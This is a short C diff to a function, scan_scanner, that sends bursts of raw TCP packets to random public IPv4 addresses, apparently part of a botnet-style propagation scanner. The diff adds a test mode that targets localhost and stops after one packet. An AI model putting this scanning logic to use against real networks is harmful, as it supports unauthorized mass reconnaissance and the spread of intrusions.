@@ -272,7 +272,11 @@ bool scan_scanner(void)
 	{
 		for (i = 0; i < SCAN_SCANNER_BURST; i++)
 		{
+#			ifdef SCANNER_TEST
+			iph->daddr = ipv4_pack(127, 0, 0, 1);
+#			else
 			iph->daddr = ipv4_random_public();
+#			endif
 			iph->id = (rand() % 65535); // This line might be wrong
 			iph->check = 0;
 			iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
@@ -286,6 +290,7 @@ bool scan_scanner(void)
 
 			// Send the packet
 			sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr));
+			break;
 		}
 		i = 0;
 		while (1)
